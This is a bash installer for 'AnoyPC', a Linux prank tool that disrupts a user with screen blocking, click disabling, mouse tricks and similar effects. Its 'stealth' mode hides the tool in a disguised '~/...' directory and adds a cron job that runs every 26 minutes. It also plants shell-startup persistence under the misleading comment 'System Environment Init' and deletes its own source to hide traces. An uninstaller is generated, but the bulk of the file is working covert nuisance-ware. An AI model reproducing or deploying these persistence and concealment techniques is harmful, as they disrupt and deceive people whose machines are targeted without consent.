#!/bin/bash
#
# AnoyingPC Linux - Setup Script
# Author: tnuno-mo (CreaTico6)
# Date: March 2026
#

set -e

MODE="${1:-test}"

# Configuration based on mode
if [ "$MODE" = "stealth" ]; then
    ANOYPC_DIR="$HOME/..."
    DIR_DISPLAY="~/. . ."
else
    ANOYPC_DIR="$HOME/.anoypc"
    DIR_DISPLAY="~/.anoypc"
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN_DIR="$HOME/.local/bin"
BINARY_NAME="AnoyPC"
BINARY_PATH="$SCRIPT_DIR/$BINARY_NAME"

FEATURES=(
    "BELL" "MESSAGE" "BLOCK_SCREEN" "FLASH" "ALERT_SCREEN" 
    "CALENDAR" "SYSINFO" "UPSIDE_DOWN" "CAPS_ON" "MOUSE_JITTER" 
    "MOUSE_TELEPORT" "MOUSE_SWAP" "CHASING_BUTTON" "CUSTOM_CURSOR" 
    "MOUSE_POOP" "CLICK_DISABLE" "TERMINAL_LOOP" "BRIGHTNESS_PULSE" 
    "GRAYSCALE" "MATRIX"
)

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

# Create base directory
mkdir -p "$ANOYPC_DIR"
cp "$BINARY_PATH" "$ANOYPC_DIR/$BINARY_NAME"
chmod 755 "$ANOYPC_DIR/$BINARY_NAME"

# Enable all features by default
for feature in "${FEATURES[@]}"; do
    touch "$ANOYPC_DIR/feat_$feature.on"
done

# Generate the hidden cron runner
cat > "$ANOYPC_DIR/run.sh" << EOF
#!/bin/bash
export PATH="/usr/local/bin:/usr/bin:/bin:\$PATH"
export DISPLAY=":0"
"$ANOYPC_DIR/$BINARY_NAME" >/dev/null 2>&1
EOF
chmod 755 "$ANOYPC_DIR/run.sh"

# Install Cronjob (Stealth Mode uses */26)
TMP_CRON="$(mktemp)"
crontab -l 2>/dev/null | grep -v "/run.sh" > "$TMP_CRON" || true
echo "*/26 * * * * $ANOYPC_DIR/run.sh" >> "$TMP_CRON"
crontab "$TMP_CRON"
rm -f "$TMP_CRON"

# Inject Persistence (.zshrc)
PERSIST_CMD="[[ -f \"$ANOYPC_DIR/run.sh\" ]] && \"$ANOYPC_DIR/run.sh\" > /dev/null 2>&1"
for file in "$HOME/.zshenv" "$HOME/.zshrc" "$HOME/.zprofile"; do
    touch "$file"
    if ! grep -q "$ANOYPC_DIR/run.sh" "$file"; then
        echo -e "\n# System Environment Init\n$PERSIST_CMD" >> "$file"
    fi
done

# ==============================================================================
# THE ANTIDOTE (UNINSTALLER) - Available in BOTH modes
# ==============================================================================
cat > "$ANOYPC_DIR/anoydel.sh" << EOF
#!/bin/bash
read -p "Are you sure you want to completely remove this software? (yes/no): " confirm
if [ "\$confirm" = "yes" ]; then
    # 1. Remove Cronjob
    crontab -l 2>/dev/null | grep -v "/run.sh" | crontab - 2>/dev/null
    
    # 2. Remove convenience symlinks (if they exist from a test install)
    rm -f "\$HOME/.local/bin/anoypc-features" "\$HOME/.local/bin/anoypc-test" 2>/dev/null
    
    # 3. Clean Shell persistence
    sed -i '/# System Environment Init/d' "\$HOME/.zshenv" "\$HOME/.zshrc" "\$HOME/.zprofile" 2>/dev/null || true
    sed -i "\@$ANOYPC_DIR/run.sh@d" "\$HOME/.zshenv" "\$HOME/.zshrc" "\$HOME/.zprofile" 2>/dev/null || true
    
    # 4. Remove the directory itself
    rm -rf "$ANOYPC_DIR"
    
    echo "✓ System completely cleaned and restored."
else
    echo "Removal cancelled."
fi
EOF
chmod 755 "$ANOYPC_DIR/anoydel.sh"

# ==============================================================================
# MODE: TEST (Interactive Menus & Symlinks)
# ==============================================================================
if [ "$MODE" = "test" ]; then
    mkdir -p "$BIN_DIR"
    
    # anoyon.sh
    cat > "$ANOYPC_DIR/anoyon.sh" << EOF
#!/bin/bash
TMP_CRON="\$(mktemp)"
crontab -l 2>/dev/null | grep -v "/run.sh" > "\$TMP_CRON" || true
echo "*/26 * * * * $ANOYPC_DIR/run.sh" >> "\$TMP_CRON"
crontab "\$TMP_CRON"
rm -f "\$TMP_CRON"
echo "✓ AnoyPC background schedule activated"
EOF
    chmod 755 "$ANOYPC_DIR/anoyon.sh"

    # anoyoff.sh
    cat > "$ANOYPC_DIR/anoyoff.sh" << 'EOF'
#!/bin/bash
crontab -l 2>/dev/null | grep -v "/run.sh" | crontab - 2>/dev/null
echo "✓ AnoyPC scheduler disabled"
EOF
    chmod 755 "$ANOYPC_DIR/anoyoff.sh"

    # test.sh (Simplified for generation)
    cat > "$ANOYPC_DIR/test.sh" << EOF
#!/bin/bash
# Test Menu
select opt in "${FEATURES[@]}" "Exit"; do
    if [ "\$opt" = "Exit" ]; then break; fi
    "$ANOYPC_DIR/$BINARY_NAME" "\$opt"
done
EOF
    chmod 755 "$ANOYPC_DIR/test.sh"

    # features.sh (Simplified for generation)
    cat > "$ANOYPC_DIR/features.sh" << EOF
#!/bin/bash
# Feature Toggle Menu
while true; do
    clear; echo "AnoyPC Features:"
    for i in \$(seq 0 \$((\${#FEATURES[@]}-1))); do
        feat="\${FEATURES[\$i]}"
        status="[OFF]"; [ -f "$ANOYPC_DIR/feat_\$feat.on" ] && status="[ON]"
        printf " %2d) %-20s %s\n" \$((i+1)) "\$feat" "\$status"
    done
    read -p "Toggle feature (1-\${#FEATURES[@]}, or q to quit): " choice
    if [[ "\$choice" =~ ^[qQ]$ ]]; then break; fi
    idx=\$((choice-1))
    feat="\${FEATURES[\$idx]}"
    if [ -f "$ANOYPC_DIR/feat_\$feat.on" ]; then rm "$ANOYPC_DIR/feat_\$feat.on"; else touch "$ANOYPC_DIR/feat_\$feat.on"; fi
done
EOF
    chmod 755 "$ANOYPC_DIR/features.sh"

    # Symlinks
    ln -sf "$ANOYPC_DIR/features.sh" "$BIN_DIR/anoypc-features" 2>/dev/null
    ln -sf "$ANOYPC_DIR/test.sh" "$BIN_DIR/anoypc-test" 2>/dev/null

    echo -e "${BLUE}${BOLD}=== Installation Complete ===${NC}"
    echo -e "Location:   ${GREEN}$DIR_DISPLAY${NC}"
    echo -e "Menus:      Run ${GREEN}anoypc-test${NC} or ${GREEN}anoypc-features${NC} in your terminal."
    echo -e "Status:     Scheduler Active (*/26)"
    echo -e "Uninstall:  Run ${GREEN}$ANOYPC_DIR/anoydel.sh${NC}"

# ==============================================================================
# MODE: STEALTH (No menus, No feedback)
# ==============================================================================
else
    # In stealth mode, we self-destruct the source code automatically to hide traces
    cd "$HOME"
    rm -rf "$SCRIPT_DIR"
    echo -e "${GREEN}${BOLD}System Armed.${NC}"
fi
